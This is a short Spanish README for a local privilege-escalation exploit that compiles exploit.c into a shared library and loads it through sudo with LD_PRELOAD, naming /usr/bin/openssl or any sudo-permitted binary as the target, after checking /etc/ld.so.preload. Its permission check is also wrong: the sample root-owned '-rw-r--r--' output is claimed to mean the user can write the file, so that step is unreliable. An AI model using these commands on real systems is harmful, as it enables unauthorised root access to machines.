# Como usar
- Primero hay que revisar que el usuario que se ejecuta el programa tenga permisos de escritura en `/etc/ld.so.preload`, para ello se puede ejecutar el siguiente comando:
```
ls -la /etc/ld.so.preload
```
- Si el output es algo como lo siguiente: `-rw-r--r-- 1 root root 0 mar  1  2021 /etc/ld.so.preload`, entonces el usuario tiene permisos de escritura en `/etc/ld.so.preload` y puede ejecutar el programa.

## Compilar
- `gcc -shared -fPIC -o exploit.so exploit.c`

## Ejecutar
- `sudo LD_PRELOAD=$PWD/exploit.so /usr/bin/openssl`
- O cualquier binario que te deje ejecutar con sudo.